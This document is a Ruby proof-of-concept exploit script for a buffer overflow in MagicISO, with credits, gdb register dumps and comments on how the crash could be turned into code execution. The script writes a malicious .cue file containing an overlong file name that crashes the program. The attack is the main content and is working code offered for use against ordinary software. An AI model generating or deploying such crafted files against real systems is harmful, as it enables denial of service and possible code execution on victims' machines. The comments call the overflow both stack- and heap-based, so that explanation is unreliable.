#!/usr/bin/env ruby
###################################
#Credits to n00b for finding this bug.
#Magic iso has a stacked based buffer over-flow when 
#We pass an overly-long file name inside the .cue file
#We are able to control alot of the registers so
#Command execution is possible,But im still learning 
#Which means this will get released as a dos poc for 
#now till i can get the help i need..Any way i will provide 
#The dubug info for you to see for your self..If any one 
#Decides to write a Local exploit for this please give 
#Credits to n00b..Ok on with the work of info collecting.
#Vendor : http://www.magiciso.com/
#Tested on win xp sp2.
#I would also like to thank the people i emailed and pm about this
#Shouts:  ~  Str0ke  ~  Marsu  ~  SM  ~ Aelphaeis  ~  vade79
#              Thanx to all you guys who helped.
###################################
#...Debug info..
# Program received signal SIGSEGV, Segmentation fault.
#  [Switching to thread 1092.0x314]
# 0x0058f05e in ?? ()
# (gdb) i r
# eax            0x41414141       1094795585
# ecx            0x41414141       1094795585
# edx            0x41414141       1094795585
# ebx            0x41414545       1094796613
# esp            0x12f5c8 0x12f5c8
# ebp            0x12f5ec 0x12f5ec
# esi            0xf4e718 16049944
# edi            0xf4eb1c 16050972
# eip            0x58f05e 0x58f05e
# eflags         0x10206  66054
# cs             0x1b     27
# ss             0x23     35
# ds             0x23     35
# es             0x23     35
# fs             0x3b     59
# gs             0x0      0
# fctrl          0xffff1273       -60813
# fstat          0xffff0000       -65536
# ftag           0xffffffff       -1
# fiseg          0x0      0
# fioff          0x0      0
# foseg          0xffff0000       -65536
# fooff          0x0      0
# ---Type <return> to continue, or q <return> to quit---
# fop            0x0      0
# (gdb)
###################################
#As you can see from the debug info we control eax ecx edx..
#The two registers shown, EAX and ECX, can be populated with user 
supplied addresses which are a part of the data that 
#is used to overflow the heap buffer. One of the address can be of a 
function pointer which needs to be overwritten, for 
#example UEF and the other can be address of user supplied code that 
needs to be executed.

$VERBOSE=nil  #~ Shut the fuck up Let me do it my way ruby's 
over-zealous warnings..

Header1 =         
           "\x46\x49\x4c\x45\x20\x22"


Bof = 'A'* 2024

Header2  =   
"\x2e\x42\x49\x4e\x22\x20\x42\x49\x4e\x41\x52\x59\x0d\x0a\x20"+
                  
"\x54\x52\x41\x43\x4b\x20\x30\x31\x20\x4d\x4f\x44\x45\x31\x2f\x32"+
                  
"\x33\x35\x32\x0d\x0a\x20\x20\x20\x49\x4e\x44\x45\x58\x20\x30\x31"+
                  "\x20\x30\x30\x3a\x30\x30\x3a\x30\x30"

n00b = Header1  + Bof + Header2
  
File.open( "MagicISO.cue", "w" ) do |the_file|

the_file.puts (n00b)

end